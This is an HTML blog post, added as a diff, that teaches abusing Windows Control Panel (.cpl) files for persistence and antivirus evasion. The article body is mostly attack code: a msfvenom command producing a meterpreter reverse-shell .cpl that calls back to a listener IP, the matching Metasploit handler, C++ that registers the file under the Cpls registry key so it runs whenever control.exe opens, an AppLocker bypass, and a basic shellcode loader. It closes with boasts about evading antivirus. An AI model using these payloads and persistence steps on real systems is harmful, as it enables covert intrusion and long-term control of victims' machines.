@@ -1,0 +1,486 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/kd.png">
+  <link rel="icon" href="/img/kd.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>巧用cpl文件维权和免杀 - SD</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"sd-xd.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>blog of SD</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="巧用cpl文件维权和免杀">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-31 19:47" pubdate>
+        2021年7月31日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">巧用cpl文件维权和免杀</h1>
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近无意间发现了cpl文件,之前对该类型的文件了解几乎为零,由于触及到我的知识盲区,于是决定探究。</p>
+<h2 id="cpl文件"><a href="#cpl文件" class="headerlink" title="cpl文件"></a>cpl文件</h2><p>CPL文件，是Windows控制面板扩展项，CPL全拼为<code>Control Panel Item</code><br>在system32目录下有一系列的cpl文件,分别对应着各种控制面板的子选项<br><img src="/img/cpl/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>列入我们<code>win+R</code>输入<code>main.cpl</code><br><img src="/img/cpl/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>将会打开控制面板中的鼠标属性<br><img src="/img/cpl/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>cpl文件本质是属于PE文件<br><img src="/img/cpl/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>但cpl并不像exe,更像是dll,无法直接打开,只能以加载的形式运行。<br>并且有一个导出函数<code>CPlApplet</code><br>该函数是控制面板应用程序的入口点，它被控制面板管理程序自动调用，且是个回调函数。<br><img src="/img/cpl/5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="如何打开cpl"><a href="#如何打开cpl" class="headerlink" title="如何打开cpl"></a>如何打开cpl</h2><p>1.双击或者win+r xxx.cpl<br>2.control &lt;文件名&gt;<br>3.rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;<br>注意：所有rundll32 shell32.dll,Control_RunDLL的命令均可用control替代，control.exe实质调用了rundll32.exe。打开后找不到control.exe进程，只能找到rundll32.exe。</p>
+<p><img src="/img/cpl/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>4.vbs脚本</p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> obj<br><span class="hljs-keyword">Set</span> obj = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br>obj.ControlPanelItem(<span class="hljs-string">&quot;C:\Users\11793\Desktop\cpl.cpl&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="/img/cpl/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>5.js脚本</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> ActiveXObject(<span class="hljs-string">&quot;Shell.Application&quot;</span>);<br>a.ControlPanelItem(<span class="hljs-string">&quot;C:\\Users\\11793\\Desktop\\cpl.cpl&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p><img src="/img/cpl/9.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="如何自己制造一个cpl文件"><a href="#如何自己制造一个cpl文件" class="headerlink" title="如何自己制造一个cpl文件"></a>如何自己制造一个cpl文件</h2><p>最简单的方式:直接创建一个dll,无需导出函数,然后改后缀名</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">WinExec</span>(<span class="hljs-string">&quot;Calc.exe&quot;</span>, SW_SHOW);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>随便一种方式执行<br><img src="/img/cpl/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里既然可以弹出calc.exe,那么能不能执行自己的payload的呢,答案是肯定的。</p>
+<h2 id="cpl文件的应用"><a href="#cpl文件的应用" class="headerlink" title="cpl文件的应用"></a>cpl文件的应用</h2><h3 id="bypass-Windows-AppLocker"><a href="#bypass-Windows-AppLocker" class="headerlink" title="bypass Windows AppLocker"></a>bypass Windows AppLocker</h3><p>什么是<code>Windows AppLocker</code>:<br>AppLocker即“应用程序控制策略”，是Windows 7系统中新增加的一项安全功能。在win7以上的系统中默认都集成了该功能。</p>
+<p>默认的Applocker规则集合,可以看到cpl并不在默认规则中:<br><img src="/img/cpl/18.png" srcset="/img/loading.gif" lazyload></p>
+<p>开启Applocker规则:<br>打开计算机管理,选择服务,将<code>Application Identity</code>服务开启<br><img src="/img/cpl/19.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后在安全策略中,添加一条applocker规则,会询问是否添加默认规则<br><img src="/img/cpl/20.png" srcset="/img/loading.gif" lazyload></p>
+<p>默认规则为:<br><img src="/img/cpl/21.png" srcset="/img/loading.gif" lazyload></p>
+<p>假设设置某一路径无法执行可执行程序,再次运行时就会提示组策略安全,不允许运行<br><img src="/img/cpl/22.png" srcset="/img/loading.gif" lazyload></p>
+<p>绕过的方式有很多,这里只讲cpl文件<br>完全可以把代码写入到cpl文件中,同样达到执行目的,这里就弹一个cmd<br><img src="/img/cpl/23.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="msf直接生成cpl文件"><a href="#msf直接生成cpl文件" class="headerlink" title="msf直接生成cpl文件"></a>msf直接生成cpl文件</h3><p>生成cpl文件<br><code>msfvenom -p windows/meterpreter/reverse_tcp -b &#39;\x00\xff&#39; lhost=192.168.111.128 lport=8877 -f dll -o cpl.cpl</code><br><img src="/img/cpl/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>将文件拖到本地并运行,msf监听</p>
+<ul>
+<li>use exploit/multi/handler</li>
+<li>set payload windows/meterpreter/reverse_tcp</li>
+<li>set lhost 192.168.111.128</li>
+<li>set lport 8877</li>
+<li>exploit</li>
+</ul>
+<p><img src="/img/cpl/11.png" srcset="/img/loading.gif" lazyload><br>这样肯定是不够的,可以把这个cpl文件当作一个后门,做到一个权限维持的效果,且比较隐蔽。<br>将cpl文件名称改为<code>test.cpl</code><br>创建一个项目,作用为修改注册表:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">HKEY hKey;<br>DWORD dwDisposition;<br><span class="hljs-keyword">char</span> path[] = <span class="hljs-string">&quot;C:\\test.cpl&quot;</span>;<br><span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_CURRENT_USER,<span class="hljs-string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WRITE, <span class="hljs-literal">NULL</span>, &amp;hKey, &amp;dwDisposition);<br><span class="hljs-built_in">RegSetValueExA</span>(hKey, <span class="hljs-string">&quot;test.cpl&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)path, (<span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlenA</span>(path)));<br></code></pre></td></tr></table></figure>
+<p>不一定将cpl文件放到c盘更目录,可以自定义路径<br>执行后<br><img src="/img/cpl/12.png" srcset="/img/loading.gif" lazyload><br>然后这里在开启control.exe时,test.cpl文件也会被打开。<br><img src="/img/cpl/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果目标主机有杀软,可以通过该方法白加黑绕过,但是msf的cpl文件特征非常明显,静态太概率都会被杀掉。<br><img src="/img/cpl/14.png" srcset="/img/loading.gif" lazyload><br>除了加壳之外,寄希望于自己实现加载shellcode,方便做混淆。</p>
+<h3 id="使用shellcode自己做一个cpl文件"><a href="#使用shellcode自己做一个cpl文件" class="headerlink" title="使用shellcode自己做一个cpl文件"></a>使用shellcode自己做一个cpl文件</h3><p>直接上代码</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function">VOID <span class="hljs-title">CPlApplet</span><span class="hljs-params">(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;test&quot;</span>, MB_OK);<br>    <span class="hljs-comment">/* length: 835 bytes */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;shellcode&quot;</span>;<br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这是最最最最基础的loader<br>先打开<code>control.exe</code>看看效果<br><img src="/img/cpl/15.png" srcset="/img/loading.gif" lazyload></p>
+<p>看看查杀率</p>
+<p><img src="/img/cpl/16.png" srcset="/img/loading.gif" lazyload><br>这里上传的文本,shellcode没有做任何的处理,查杀率已经算比较低的,如果混淆一下,很轻松的就可以静态过杀软,再用白加黑,是不是想想就很轻松呢。</p>
+<p>经过一系列处理后,找杀毒能力还比较强的360试一下<br><img src="/img/cpl/17.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html">https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/002/">https://attack.mitre.org/techniques/T1218/002/</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules">https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/26/br_domain2/">
+                        <span class="hidden-mobile">渗透日记一(下)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
